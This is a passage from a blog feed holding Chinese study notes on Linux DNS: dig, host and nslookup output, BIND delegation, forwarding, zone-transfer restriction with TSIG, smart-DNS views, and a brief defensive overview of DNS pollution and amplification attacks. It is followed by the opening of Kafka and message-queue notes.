&lt;&lt;&gt;&gt; www.baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 33977</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;www.baidu.com.INA</span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">www.baidu.com.546INCNAMEwww.a.shifen.com.</span><br><span class="line">www.a.shifen.com.199INA14.215.177.38</span><br><span class="line">www.a.shifen.com.199INA14.215.177.37</span><br><span class="line">;; Query time: 42 msec</span><br><span class="line">;; SERVER: 114.114.114.119<span class="comment">#53(114.114.114.119)</span></span><br><span class="line">;; WHEN: Mon Aug 29 20:33:36 2016</span><br><span class="line">;; MSG SIZE  rcvd: 90</span><br></pre></td></tr></table></figure><p>host命令使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#host www.baidu.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#host -t SOA baidu.com</span></span><br><span class="line">baidu.com has SOA record dns.baidu.com. sa.baidu.com. 2012132847 300 300 2592000 7200</span><br><span class="line"></span><br><span class="line"><span class="comment">#host -t NS baidu.com</span></span><br><span class="line">baidu.com name server dns.baidu.com.</span><br><span class="line">baidu.com name server ns2.baidu.com.</span><br><span class="line">baidu.com name server ns3.baidu.com.</span><br><span class="line">baidu.com name server ns4.baidu.com.</span><br><span class="line">baidu.com name server ns7.baidu.com.</span><br><span class="line"></span><br><span class="line"><span class="comment">#host -t A baidu.com</span></span><br><span class="line">baidu.com has address 220.181.57.217</span><br><span class="line">baidu.com has address 123.125.114.144</span><br><span class="line">baidu.com has address 111.13.101.208</span><br><span class="line">baidu.com has address 180.149.132.47</span><br></pre></td></tr></table></figure><p>nslookup命令使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#nslookup www.baidu.com</span></span><br><span class="line">Server:114.114.114.119</span><br><span class="line">Address:114.114.114.119<span class="comment">#53</span></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.baidu.comcanonical name = www.a.shifen.com.</span><br><span class="line">Name:www.a.shifen.com</span><br><span class="line">Address:14.215.177.37</span><br><span class="line">Name:www.a.shifen.com</span><br><span class="line">Address:14.215.177.38</span><br><span class="line"></span><br><span class="line"><span class="comment">## nslookup可以进入交互模式单独查找SOA，A等等记录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#nslookup</span></span><br><span class="line">&gt;<span class="built_in">set</span> q=soa</span><br><span class="line">&gt;baidu.com</span><br><span class="line">Server:114.114.114.119</span><br><span class="line">Address:114.114.114.119<span class="comment">#53</span></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">baidu.com</span><br><span class="line">origin = dns.baidu.com</span><br><span class="line">mail addr = sa.baidu.com</span><br><span class="line">serial = 2012132847</span><br><span class="line">refresh = 300</span><br><span class="line">retry = 300</span><br><span class="line">expire = 2592000</span><br><span class="line">minimum = 7200</span><br><span class="line">Authoritative answers can be found from:</span><br><span class="line"></span><br><span class="line">&gt;<span class="built_in">set</span> q=a</span><br><span class="line">&gt;baidu.com</span><br><span class="line">Server:114.114.114.119</span><br><span class="line">Address:114.114.114.119<span class="comment">#53</span></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:baidu.com</span><br><span class="line">Address:180.149.132.47</span><br><span class="line">Name:baidu.com</span><br><span class="line">Address:123.125.114.144</span><br><span class="line">Name:baidu.com</span><br><span class="line">Address:111.13.101.208</span><br><span class="line">Name:baidu.com</span><br><span class="line">Address:220.181.57.217</span><br></pre></td></tr></table></figure><p>dig命令使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## 反向解析：dig -x 网址IP地址 @DNS地址</span><br><span class="line">#dig -x 14.215.177.38 @114.114.114.119</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613213426.png" alt="image-20210613213402523"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## dig -t 指定要查询的记录类型</span></span><br><span class="line"><span class="comment">#dig -t a baidu.com</span></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.17.rc1.el6 &lt;&lt;&gt;&gt; -t a baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 48165</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;baidu.com.INA</span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">baidu.com.227INA220.181.57.217</span><br><span class="line">baidu.com.227INA180.149.132.47</span><br><span class="line">baidu.com.227INA123.125.114.144</span><br><span class="line">baidu.com.227INA111.13.101.208</span><br><span class="line">;; Query time: 36 msec</span><br><span class="line">;; SERVER: 114.114.114.119<span class="comment">#53(114.114.114.119)</span></span><br><span class="line">;; WHEN: Mon Aug 29 20:51:30 2016</span><br><span class="line">;; MSG SIZE  rcvd: 91</span><br></pre></td></tr></table></figure><h1 id="第二部Bind负载均衡"><a href="#第二部Bind负载均衡" class="headerlink" title="第二部Bind负载均衡"></a>第二部Bind负载均衡</h1><h2 id="DNS递归迭代查询"><a href="#DNS递归迭代查询" class="headerlink" title="DNS递归迭代查询"></a>DNS递归迭代查询</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613214405.png" alt="image-20210613214403233"></p><p>DNS递归查询：DNS服务器接收到客户机请求，必须使用一个准确的查询结果回复客户机。如果DNS服务器本地没有存储查询DNS 信息，那么该服务器会询问其他服务器；<br>迭代查询：DNS 服务器会向客户机提供其他能够解析查询请求的DNS服务器地址，当客户机发送查询请求时，DNS服务器并不直接回复查询结果，而是告诉客户机另一台DNS服务器地址，客户机再向这台DNS服务器提交请求，依次循环直到返回查询的结果为止。<br>一般默认禁止递归查询，服务器只要告诉客户端本地是否有数据即可，而非请求寻找其他服务器再给客户端答案，出于安全和系统资源考虑。</p><p><strong>DNS递归参数</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613214901.png" alt="image-20210613214444902"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dig最基本的使用方式就是</span></span><br><span class="line">dig www.oolec.com</span><br><span class="line"><span class="comment"># 即查询域名的A记录，查询的dns服务器将采用系统配置的服务器，即/etc/resovle.conf 中的。</span></span><br><span class="line"><span class="comment"># 此外，如果你是一个系统管理员，部署好了一台dns服务器之后想对它进行解析测试，就必须要显式指定待测试的dns服务器地址了，例如</span></span><br><span class="line">dig @202.106.0.20 www.oolec.com </span><br><span class="line"><span class="comment"># 如果要查询其他类型的记录，比如MX，CNAME，NS，PTR等，只需将类型加在命令后面即可</span></span><br><span class="line">dig www.oolec.com mx</span><br><span class="line">dig www.oolec.com ns</span><br><span class="line">vim /etc/named.conf</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613214818.png" alt="image-20210613214816071"></p><h2 id="子域授权"><a href="#子域授权" class="headerlink" title="子域授权"></a>子域授权</h2><p>NS记录，子域授权，父域，子域</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613220454.png" alt="image-20210613214938049"></p><p>创建/etc/named.conf文件并编辑，配置option和子域的zone</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613220457.png" alt="image-20210613215750676"></p><p>编辑imooc.com.zone，添加子域的授权</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613215202.png" alt="image-20210613215048385"></p><p>配置test.imooc.com.zone文件</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613220509.png" alt="image-20210613220102189"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613221211.png" alt="image-20210613220735327"></p><h2 id="DNS转发"><a href="#DNS转发" class="headerlink" title="DNS转发"></a>DNS转发</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613221221.png" alt="image-20210613221207089"></p><p>DNS转发参数：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613221257.png" alt="image-20210613221249774"></p><p>DNS转发配置</p><p>全局转发，如果本服务器无法解析，自动向forwarders中服务器进行请求转发</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613221447.png" alt="image-20210613221444563"></p><p>DNS指定特定域的转发配置</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613221531.png" alt="image-20210613221529264"></p><h2 id="DNS主从区域传输"><a href="#DNS主从区域传输" class="headerlink" title="DNS主从区域传输"></a>DNS主从区域传输</h2><p><em>8DNS区域*</em></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613221814.png" alt="image-20210613221808873"></p><p><strong>DNS主从同步原理</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614000231.png" alt="image-20210613221933360"></p><p><strong>主从同步配置</strong></p><p>vim /etc/named.conf</p><p>DNS主从同步配置（Master服务器）：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">zone</span> <span class="string">"imooc.com"&#123;</span></span><br><span class="line"><span class="attr">type</span> <span class="string">master;</span></span><br><span class="line"><span class="attr">notify</span> <span class="string">yes;</span></span><br><span class="line"><span class="meta">also-notify</span> <span class="string">&#123;30.96.8.233;&#125;;</span></span><br><span class="line"><span class="attr">file</span> <span class="string">"imooc.com.zone";</span></span><br><span class="line"><span class="attr">&#125;;</span></span><br></pre></td></tr></table></figure><p>DNS主从同步配置（Slave服务器）：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">zone</span> <span class="string">"imooc.com"&#123;</span></span><br><span class="line"><span class="attr">type</span> <span class="string">slave;</span></span><br><span class="line"><span class="attr">file</span> <span class="string">"slaves/imooc.com.zone";</span></span><br><span class="line"><span class="attr">masters</span> <span class="string">&#123;30.96.8.232;&#125;;</span></span><br><span class="line"><span class="attr">&#125;;</span></span><br></pre></td></tr></table></figure><p>DNS主从同步配置注意问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.确保防火墙规则开放（建议关闭）</span><br><span class="line">2.确保目录权限（系统默认named用户）</span><br><span class="line">3.保持主从服务器时钟一致</span><br><span class="line">4.搭建完毕后，若修改主从服务器域配置，Serail number必须递增</span><br></pre></td></tr></table></figure><p><strong>DNS区域传输限制</strong></p><p>区域传输限制是为了服务器的安全，保护信息的敏感性</p><p>实现区域传输限制的两种方法：<br>1.基于主机的访问控制<br>2.事务签名</p><p>区域传输限制实现方法1-基于主机的访问控制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参数：allow-transfer</span><br><span class="line">选项：&#123;address_list | none&#125;;</span><br><span class="line">作用：允许域传输机器列表</span><br></pre></td></tr></table></figure><h2 id="DNS数据加密方式"><a href="#DNS数据加密方式" class="headerlink" title="DNS数据加密方式"></a>DNS数据加密方式</h2><p>区域传输限制信息加密方式：<br>1.DES：对称加密<br>2.IDEA：非对称加密，私钥包括公钥和私钥，安全性较DES方式高。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613223350.png" alt="image-20210613223347951"></p><p>区域传输限制方法2-DNS事务签名：<br>TSIG：对称方式<br>SIG0：非对称方式</p><p>TSIG事务签名：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613223617.png" alt="image-20210613223611093"></p><p>生成dns的key -a 指定加密算法， -b指定加密位数 jeson-key为key的名称</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613224324.png" alt="image-20210613224032943"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613224318.png" alt="image-20210613224311426"></p><p>新建文件jeson-key</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613224941.png" alt="image-20210613224433956"></p><p>编辑/etc/named.conf</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613224631.png" alt="image-20210613224629244"></p><p>将主服务器的key传给从服务器</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613224948.png" alt="image-20210613224935709"></p><p>编辑/etc/named.conf</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613225057.png" alt="image-20210613225055410"></p><p>配置完毕后，若修改主从服务器域配置，Serail number必须递增</p><h1 id="第三部智能DNS"><a href="#第三部智能DNS" class="headerlink" title="第三部智能DNS"></a>第三部智能DNS</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613225744.png" alt="image-20210613225521380"></p><h2 id="智能DNS作用"><a href="#智能DNS作用" class="headerlink" title="智能DNS作用"></a>智能DNS作用</h2><ol><li>CDN加速  </li><li>减少动态响应延时  </li><li>负载均衡  </li><li>防止DDOS攻击</li></ol><h2 id="智能DNS缺陷"><a href="#智能DNS缺陷" class="headerlink" title="智能DNS缺陷"></a>智能DNS缺陷</h2><ol><li>成本增加（如硬件成本、维护成本）</li><li>不配套支持应用检测机制</li><li>准确性欠缺</li></ol><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613225741.png" alt="image-20210613225644622" style="zoom:67%;" /><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CNT 电信</span><br><span class="line">CNU 联通</span><br><span class="line">CNM 移动</span><br></pre></td></tr></table></figure><h2 id="智能DNS的IP库"><a href="#智能DNS的IP库" class="headerlink" title="智能DNS的IP库"></a>智能DNS的IP库</h2><p>IP库：能提供完整且准确的IP地址位置等信息</p><p>IP库获取途径</p><ol><li>商业第三方机构、ISP提供</li><li>自己修正或者弥补</li><li>通过APINC生成IP库</li></ol><p>通过APINC生成IP库：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ftp://ftp.apnic.net/public/apnic/stats/apnic/assigned-apnic-latest</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613230159.png" alt="image-20210613230155512"></p><h2 id="Bind中的ACL"><a href="#Bind中的ACL" class="headerlink" title="Bind中的ACL"></a>Bind中的ACL</h2><p>ACL：媒体访问控制列表</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613230339.png" alt="image-20210613230335765"></p><p>求子网掩码位数：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613230516.png" alt="image-20210613230501718"></p><p>具体程序实现方法：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613230624.png" alt="image-20210613230557355"></p><p>shell获取智能DNS的IP库</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613230824.png" alt="image-20210613230718580"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613230912.png" alt="image-20210613230910410"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613231415.png" alt="image-20210613231120841"></p><p>保存后执行sh Download_ip_pools.sh</p><p>将三个文件改为以.acl后缀结尾的文件，把结尾替换成分号</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613231421.png" alt="image-20210613231410058"></p><p>顶部结尾闭合</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613231542.png" alt="image-20210613231540088"></p><p>其他两个文件也是如此</p><h2 id="Bind中的view配置"><a href="#Bind中的view配置" class="headerlink" title="Bind中的view配置"></a>Bind中的view配置</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613232217.png" alt="image-20210613232214804"></p><p>拷贝</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613232222.png" alt="image-20210613231955467"></p><p>查看imooc.com.chinanet.zone</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614000201.png" alt="image-20210613234740674"></p><p>设置，如果是电信用户，访问2.2.2.2；如果是联通用户，访问1.1.1.1；如果是其他，访问3.3.3.3</p><p>测试：把当前主机地址拷贝到CHINANET.acl里面</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613232538.png" alt="image-20210613232319484"></p><p>reload</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613232535.png" alt="image-20210613232532687"></p><p>输入dig @30.96.8.232 <a href="http://www.imooc.com" target="_blank" rel="noopener">www.imooc.com</a></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613235253.png" alt="image-20210613232657012"></p><h2 id="DNS安全"><a href="#DNS安全" class="headerlink" title="DNS安全"></a>DNS安全</h2><p><strong>DNS信息污染</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613235055.png" alt="image-20210613235052806"></p><p>DNS信息污染演示</p><p>用UDP的方式查询：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613235243.png" alt="image-20210613235236922"></p><p>用TCP的方式查询结果是不一样的：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613235456.png" alt="image-20210613235453961"></p><p>查找ip来源</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614000141.png" alt="image-20210613235522807"></p><p><strong>DNS拒绝服务攻击</strong></p><ol><li>利用DNS软件版本漏洞攻击</li><li>DDOS攻击</li></ol><p><strong>DNS放大攻击</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614000110.png" alt="image-20210613235747242"></p><p>如何避免自己的DNS服务器沦为肉机</p><ol><li>关注自己DNS版本，尽量保持更新</li><li>用于权威解析的DNS服务，关闭递归查询</li><li>用于递归查询的服务器，尽量限制服务使用范围</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux之智能DNS大纲速览&quot;&gt;&lt;a href=&quot;#Linux之智能DNS大纲速览&quot; class=&quot;headerlink&quot; title=&quot;Linux之智能DNS大纲速览&quot;&gt;&lt;/a&gt;Linux之智能DNS大纲速览&lt;/h1&gt;&lt;p&gt;Linux之智能DNS是我今天在慕课
      
    
    </summary>
    
    
      <category term="计算机网络" scheme="https://blog.kaluna.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="DNS" scheme="https://blog.kaluna.top/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>Kafka学习笔记</title>
    <link href="https://blog.kaluna.top/2021/06/10/Kafka%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.kaluna.top/2021/06/10/Kafka%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-06-10T02:53:42.073Z</published>
    <updated>2021-06-13T11:24:27.594Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分布式流处理平台Kafka大纲速览"><a href="#分布式流处理平台Kafka大纲速览" class="headerlink" title="分布式流处理平台Kafka大纲速览"></a>分布式流处理平台Kafka大纲速览</h1><h2 id="技术技术栈和环境说明"><a href="#技术技术栈和环境说明" class="headerlink" title="技术技术栈和环境说明"></a>技术技术栈和环境说明</h2><ul><li>Kafka版本：2.8.0</li><li>Scala版本：2.13</li><li>Zookeeper版本：3.7</li><li>SpringBoot.2.5 + Maven + IDEA旗舰版 + JDK8 或 JDK11</li></ul><h2 id="大纲速览"><a href="#大纲速览" class="headerlink" title="大纲速览"></a>大纲速览</h2><ul><li><p>高性能分布式流处理平台 Kafka核心知识+项目实战</p></li><li><p>Kakfa多种工作模式,点对点/发布订阅模型和应用场景</p></li><li><p>核心概念 生产者、消费者 Broker/Topic/Partition/leader/follower等</p></li><li><p>Linux服务器急速部署Zookeeper、Kafka，多种控制台操作指令，分区控制等</p></li><li><p>SpringBoot整合Kafka原生多个模块Admin/Producer/Consumer核心API+SpringKafka实战</p></li><li><p>高级篇-Kafka存储流程和原理讲解LEO+HW+Offset</p></li><li><p>高级篇-生产者发送消息模型、分区策略和核心配置实战，自定义分区Key策略等</p></li><li><p>高级篇-消费者消费消息模型、分区策略和重Rebalance实战等</p><p>高级篇-Broker数据文件存储模型-ACK和副本可靠性原理分析+ISR模型</p></li><li><p>高级篇-高可用搭建Zookeeper集群+Kafka集群+SpringBoot项目整合和故障演练</p></li><li><p>高级篇-Kafka高性能原理分析ZeroCopy+多案例事务消息实战+大数据技术栈路线</p></li><li><p>Kafka架构+设计思想+底层原理+互联网大厂面试题等</p></li></ul><h1 id="MQ消息中间件-JMS-AMQP核心知识"><a href="#MQ消息中间件-JMS-AMQP核心知识" class="headerlink" title="MQ消息中间件+JMS+AMQP核心知识"></a>MQ消息中间件+JMS+AMQP核心知识</h1><h2 id="什么是MQ消息中间件和应用场景"><a href="#什么是MQ消息中间件和应用场景" class="headerlink" title="什么是MQ消息中间件和应用场景"></a>什么是MQ消息中间件和应用场景</h2><ul><li>什么是MQ消息中间件<ul><li>全称MessageQueue，主要是用于程序和程序直接通信，异步+解耦</li></ul></li><li>使用场景：<ul><li>核心应用<ul><li>解耦：订单系统-》物流系统</li><li>异步：用户注册-》发送邮件，初始化信息</li><li>削峰：秒杀、日志处理</li></ul></li><li>跨平台 、多语言</li><li>分布式事务、最终一致性</li><li>RPC调用上下游对接，数据源变动-&gt;通知下属</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210610110809.png" alt="image-20210610110754781"></p><h2 id="JMS消息服务和和常见核心概念"><a href="#JMS消息服务和和常见核心概念" class="headerlink" title="JMS消息服务和和常见核心概念"></a>JMS消息服务和和常见核心概念</h2><ul><li><p>什么是JMS: Java消息服务（Java Message Service),Java平台中关于面向消息中间件的接口</p><ul><li><p>JMS是一种与厂商无关的 API，用来访问消息收发系统消息，它类似于JDBC(Java Database Connectivity)。这里，JDBC 是可以用来访问许多不同关系数据库的 API</p></li><li><p>是由Sun公司早期提出的消息标准，旨在为java应用提供统一的消息操作，包括create、send、receive</p></li><li><p>JMS是针对java的，那微软开发了NMS（.NET消息传递服务）</p></li><li><p>特性</p><ul><li>面向Java平台的标准消息传递API</li><li>在Java或JVM语言比如Scala、Groovy中具有互用性</li><li>无需担心底层协议</li><li>有queues和topics两种消息传递模型</li><li>支持事务、能够定义消息格式（消息头、属性和内容）</li></ul></li><li><p>常见概念</p><ul><li>JMS提供者：连接面向消息中间件的，JMS接口的一个实现，RocketMQ,ActiveMQ,Kafka等等</li><li>JMS生产者(Message Producer)：生产消息的服务</li><li>JMS消费者(Message Consumer)：消费消息的服务</li><li>JMS消息：数据对象</li><li>JMS队列：存储待消费消息的区域</li><li>JMS主题：一种支持发送消息给多个订阅者的机制</li><li>JMS消息通常有两种类型：点对点（Point-to-Point)、发布/订阅（Publish/Subscribe）</li></ul></li><li><p>基础编程模型</p><ul><li>MQ中需要用的一些类</li><li>ConnectionFactory ：连接工厂，JMS 用它创建连接</li><li>Connection ：JMS 客户端到JMS Provider 的连接</li><li>Session： 一个发送或接收消息的线程</li><li>Destination ：消息的目的地;消息发送给谁.</li><li>MessageConsumer / MessageProducer： 消息消费者，消息生产者</li></ul></li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210610110915.png" alt="image-20210610110913772"></p><h2 id="AMQP高级消息队列协议和MQTT科普"><a href="#AMQP高级消息队列协议和MQTT科普" class="headerlink" title="AMQP高级消息队列协议和MQTT科普"></a>AMQP高级消息队列协议和MQTT科普</h2><ul><li>背景<ul><li>JMS或者NMS都没有标准的底层协议，API是与编程语言绑定的，每个消息队列厂商就存在多种不同格式规范的产品，对使用者就产生了很多问题, AMQP解决了这个问题，它使用了一套标准的底层协议</li></ul></li><li>什么是AMQP<ul><li>AMQP（advanced message queuing protocol）在2003年时被提出，最早用于解决金融领不同平台之间的消息传递交互问题,就是是一种协议，兼容JMS</li><li>更准确说的链接协议 binary- wire-level-protocol 直接定义网络交换的数据格式，类似http</li><li>具体的产品实现比较多，RabbitMQ就是其中一种</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210610111447.png" alt="image-20210610111444397"></p><ul><li>特性<ul><li>独立于平台的底层消息传递协议</li><li>消费者驱动消息传递</li><li>跨语言和平台的互用性、属于底层协议</li><li>有5种交换类型direct，fanout，topic，headers，system</li><li>面向缓存的、可实现高性能、支持经典的消息队列，循环，存储和转发</li><li>支持长周期消息传递、支持事务（跨消息队列）</li></ul></li><li>AMQP和JMS的主要区别<ul><li>AMQP不从API层进行限定，直接定义网络交换的数据格式,这使得实现了AMQP的provider天然性就是跨平台</li><li>比如Java语言产生的消息，可以用其他语言比如python的进行消费</li><li>AQMP可以用http来进行类比，不关心实现接口的语言，只要都按照相应的数据格式去发送报文请求，不同语言的client可以和不同语言的server进行通讯</li><li>JMS消息类型：TextMessage/ObjectMessage/StreamMessage等</li><li>AMQP消息类型：Byte[]</li></ul></li><li>MQTT<ul><li>MQTT: 消息队列遥测传输（Message Queueing Telemetry Transport ）</li><li>背景：<ul><li>我们有面向基于Java的企业应用的JMS和面向所有其他应用需求的AMQP，那这个MQTT是做啥的？</li></ul></li><li>原因<ul><li>计算性能不高的设备不能适应AMQP上的复杂操作,MQTT它是专门为小设备设计的</li><li>MQTT主要是是物联网（IOT）中大量的使用</li></ul></li><li>特性<ul><li>内存占用低，为小型无声设备之间通过低带宽发送短消息而设计</li><li>不支持长周期存储和转发，不允许分段消息（很难发送长消息）</li><li>支持主题发布-订阅、不支持事务（仅基本确认）</li><li>消息实际上是短暂的（短周期）</li><li>简单用户名和密码、不支持安全连接、消息不透明</li></ul></li></ul></li></ul><h2 id="业界主流消息队列和技术选型"><a href="#业界主流消息队列和技术选型" class="headerlink" title="业界主流消息队列和技术选型"></a>业界主流消息队列和技术选型</h2><ul><li><p>业界主流的消息队列：Apache ActiveMQ、Kafka、RabbitMQ、RocketMQ</p><ul><li><p>ActiveMQ：<a href="http://activemq.apache.org/" target="_blank" rel="noopener">http://activemq.apache.org/</a></p><ul><li><p>Apache出品，历史悠久，支持多种语言的客户端和协议，支持多种语言Java, .NET, C++ 等</p></li><li><p>基于JMS Provider的实现</p></li><li><p>缺点：吞吐量不高，多队列的时候性能下降，存在消息丢失的情况，比较少大规模使用</p></li></ul></li><li><p>Kafka：<a href="http://kafka.apache.org/" target="_blank" 